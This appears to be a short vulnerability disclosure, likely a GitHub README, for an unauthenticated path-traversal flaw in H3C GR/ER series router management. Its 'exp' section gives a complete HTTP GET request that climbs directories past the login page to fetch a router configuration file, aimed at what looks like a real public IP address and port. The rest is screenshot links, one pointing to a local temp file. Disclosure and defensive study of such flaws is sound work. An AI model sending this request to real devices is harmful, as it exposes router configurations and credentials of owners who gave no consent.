# H3C GR series router system management has unauthorized access vulnerability

**Product**: GR series router

**version**: all

**rating**: high-risk

**website**: http://www.h3c.com/

**Hazards**: Attackers can exploit this vulnerability to obtain sensitive information from routers by constructing special request packets to bypass identity verification.

**principle**: The router did not authenticate directory access and related files

**exp**:

```http
GET /userLogin.asp/../actionpolicy_status/../GR1100-P.cfg HTTP/1.1
Host: 123.178.139.174:8989
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

Sphere of influence：H3C Router Management ER Partial series

The address of the vulnerability：





 

ER Screenshots of the rest of the series：

 

ER5200G2：![image](https://github.com/CJCniubi666/H3C-ER/assets/140289246/4c381e01-2c76-46b7-85b4-678bc960c92f)

![image](https://github.com/CJCniubi666/H3C-ER/assets/140289246/046206b9-7728-4715-aafb-a867f9ac390d)

![image](https://github.com/CJCniubi666/H3C-ER/assets/140289246/c29ea543-8de9-479f-95cd-21be85e6625e)


 

![img](file:///C:/Users/Lenovo/AppData/Local/Temp/msohtmlclip1/01/clip_image014.png)

 

